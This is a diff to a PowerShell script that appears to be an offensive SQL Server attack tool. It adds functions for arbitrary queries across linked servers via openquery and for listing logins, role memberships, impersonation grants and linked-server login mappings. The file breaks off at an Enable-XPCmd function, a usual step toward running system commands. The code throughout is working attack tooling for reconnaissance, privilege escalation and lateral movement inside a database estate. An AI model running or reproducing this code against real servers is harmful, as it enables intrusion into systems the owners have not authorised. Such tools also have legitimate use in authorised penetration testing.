@@ -1,10 +1,17 @@
 Function Evil-SQLConnect()
 {
     Param(
-        $InstanceName,
-        $DatabaseName,
-        $Username,
-        $Password
+        [Parameter()]
+        [string]$InstanceName,
+ 
+        [Parameter()]
+        [string]$DatabaseName,
+
+        [Parameter()]
+        [string]$Username,
+
+        [Parameter()]
+        [string]$Password   
     )
     
     if($InstanceName -eq $null)
@@ -122,18 +129,17 @@ Function Run-CustomQuery()
     if($Server -ne "")
     {
         Write-Output "[I] Executing Query on :$Server"
-        $Records = Run-SQLQuery "Select X6p7yyQ33v from openquery(""$Server"",'$Query as X6p7yyQ33v')"
+        $cmd = New-Object system.Data.SqlClient.SqlCommand("Select * from openquery(""$Server"",'$Query')",$EvilSQLConnection)
     }
     else
     {
-        $Records = Run-SQLQuery $Query
+        $cmd = New-Object system.Data.SqlClient.SqlCommand($Query,$EvilSQLConnection)
     }
-
+    $ds = New-Object system.Data.DataSet
+    $da = New-Object system.Data.SqlClient.SqlDataAdapter($cmd)
+	[void]$da.fill($ds)
     Write-Output "[I] Result of query:"
-	foreach ($item in $Records) 
-    {
-		Write-Output " $item"
-	}  
+    $ds.Tables
 }
 
 Function Get-CurrentContext()
@@ -146,16 +152,41 @@ Function Get-CurrentContext()
     if($Server -ne "")
     {
         Write-Output "[I] Executing Query on :$Server"
-        $Records = Run-SQLQuery "Select X6p7yyQ33v from openquery(""$Server"",'SELECT USER_NAME() as X6p7yyQ33v')"
+        $Records = Run-SQLQuery "Select * from openquery(""$Server"",'SELECT SYSTEM_USER')"
+        $Records2 = Run-SQLQuery "Select * from openquery(""$Server"",'SELECT USER_NAME()')"
     }
     else
     {
-        $Records = Run-SQLQuery "SELECT USER_NAME()"
+        $Records = Run-SQLQuery "SELECT SYSTEM_USER"
+        $Records2 = Run-SQLQuery "SELECT USER_NAME()"
     }
+
     foreach ($item in $Records) {
-	    Write-Output "[I] Executing in the context of: $item"
+	    Write-Output "[+] Current Login Username: $item"
+    }
+    foreach ($item in $Records2) {
+	    Write-Output "[+] Executing in the context of: $item"
     }
 }
+Function Get-SQLUsers()
+{
+        Param(
+        [Parameter()]
+        [string]$Server
+    )
+        
+    if($Server -ne "")
+    {
+        Write-Output "[I] Executing Query on :$Server"
+        $Records = Run-CustomQuery "Select * from openquery(""$Server"",'SELECT members.Name, roles.name AS Role, members.type_desc as LoginType FROM sys.server_role_members AS server_role_members INNER JOIN sys.server_principals AS roles ON server_role_members.role_principal_id = roles.principal_id INNER JOIN sys.server_principals AS members ON server_role_members.member_principal_id = members.principal_id')"
+    }
+    else
+    {
+        $Records = Run-CustomQuery "SELECT members.Name, roles.name AS Role, members.type_desc as LoginType FROM sys.server_role_members AS server_role_members INNER JOIN sys.server_principals AS roles ON server_role_members.role_principal_id = roles.principal_id INNER JOIN sys.server_principals AS members ON server_role_members.member_principal_id = members.principal_id"
+    }
+    $Records
+}
+
 Function Get-ImpersonationLogins()
 {
     $Records = Run-SQLQuery "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"
@@ -184,6 +215,24 @@ Function Get-LinkedServers()
     {
 	    Write-Output "[+] Find Linked SQL Server: $item"
     }
+}
+Function Get-LinkedServersEx()
+{
+    Param(
+        [Parameter()]
+        [string]$Server
+    )
+        
+    if($Server -ne "")
+    {
+        Write-Output "[I] Executing Query on :$Server"
+        $Records = Run-CustomQuery -Query "SELECT s.Name as ServerName, s.is_linked as Linked, s.is_remote_login_enabled as Remote_Login_Enabled, s.is_rpc_out_enabled as RPC_Enabled, sp.Name, ll.Remote_Name FROM sys.Servers s LEFT OUTER JOIN sys.linked_logins ll ON ll.server_id = s.server_id LEFT OUTER JOIN sys.server_principals sp ON sp.principal_id = ll.local_principal_id" -Server $Server
+    }
+    else
+    {
+        $Records =  Run-CustomQuery "SELECT s.Name as ServerName, s.is_linked as Linked, s.is_remote_login_enabled as Remote_Login_Enabled, s.is_rpc_out_enabled as RPC_Enabled, sp.Name, ll.Remote_Name FROM sys.Servers s LEFT OUTER JOIN sys.linked_logins ll ON ll.server_id = s.server_id LEFT OUTER JOIN sys.server_principals sp ON sp.principal_id = ll.local_principal_id"
+    }
+    $Records
 }
 
 Function Enable-XPCmd()
